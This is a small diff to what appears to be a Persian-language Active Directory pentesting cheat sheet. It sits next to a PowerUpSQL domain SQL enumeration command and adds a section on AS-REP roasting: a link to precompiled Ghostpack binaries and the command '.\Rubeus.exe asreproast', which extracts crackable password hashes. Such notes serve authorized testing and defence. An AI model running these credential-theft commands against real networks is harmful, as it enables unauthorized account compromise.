@@ -1524,3 +1524,10 @@ https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.ps1
 Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 ```
 
+## بدست آوردن AS-REP Roast hash
+
+```text
+https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
+.\Rubeus.exe asreproast
+```
+
